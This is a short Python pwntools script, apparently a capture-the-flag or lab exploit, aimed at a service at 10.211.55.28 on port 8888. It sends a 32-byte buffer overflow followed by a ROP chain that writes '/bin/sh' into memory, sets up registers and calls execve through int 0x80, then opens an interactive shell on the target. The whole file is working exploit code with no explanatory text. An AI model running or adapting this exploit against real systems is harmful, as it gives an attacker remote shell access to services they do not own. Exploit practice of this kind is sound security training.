#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.28"
port = 8888

r = remote(host,port)

gadget = 0x809a15d # mov dword ptr [edx], eax ; ret
pop_eax_ret = 0x80bae06
pop_edx_ret = 0x806e82a
pop_edx_ecx_ebx = 0x0806e850
pop_eax_ret = 0x080bae06
buf = 0x80ea060
int_80 = 0x80493e1

#write to memory
payload = "a"*32
payload += p32(pop_edx_ret)
payload += p32(buf)
payload += p32(pop_eax_ret)
payload += "/bin"
payload += p32(gadget)
payload += p32(pop_edx_ret)
payload += p32(buf+4)
payload += p32(pop_eax_ret)
payload += "/sh\x00"
payload += p32(gadget)

#write to register
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)
payload += p32(0)
payload += p32(buf)
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(int_80)

print len(payload)
r.recvuntil(":")
r.sendline(payload)

r.interactive()
